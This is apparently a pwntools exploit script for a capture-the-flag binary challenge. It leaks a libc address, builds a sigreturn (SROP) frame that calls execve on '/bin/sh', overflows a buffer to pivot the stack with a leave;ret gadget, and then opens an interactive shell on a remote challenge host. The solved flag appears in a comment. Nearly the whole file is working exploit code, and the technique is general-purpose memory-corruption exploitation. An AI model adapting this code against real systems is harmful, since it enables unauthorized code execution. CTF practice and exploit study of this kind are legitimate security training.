#!/usr/bin/env python3
from signal import strsignal
from pwn import *

exe = ELF("./warmupe")
libc = ELF("./libc.so.6")
# context.log_level='debug'
context.terminal = ["foot"]
if args.REMOTE:
    p = remote("172.210.129.230", 1338)
else:
    p = process([exe.path])
    gdb.attach(p, """"

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
addr = int(p.recvuntil(b"name>>",drop=True),16)
leave_ret = 0x0000000000401280
libc.address = addr-libc.sym.puts
pop_rax = libc.address +0x00000000000dd237
syscall = libc.address + 0x00000000000288b5
pop_rdi = 0x000000000010f75b+libc.address
log.info(f"base: {hex(libc.address)}")
log.info(f"addr: {hex(addr)}")
context.clear(arch="amd64")
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = libc.search("/bin/sh").__next__()
frame.rsp = exe.sym.name
frame.rip = syscall
payload = flat(
        pop_rax,
        0xf,
        syscall,
        frame

        )
sl(payload)
# sl(b"a"*8 + b"a"*472+p64(pop_rdi)+p64(libc.sym.environ)+p64(exe.sym.main+117))
sl(b"a"*(72-8)+p64(exe.sym.name-8)+p64(leave_ret))
#AKASEC{1_Me44444N_J00_C0ULDve_ju57_574CK_p1V07ed}

#p64()+p64(libc.address + 1881135)+p64(libc.sym.system)







p.interactive()
# good luck pwning :)

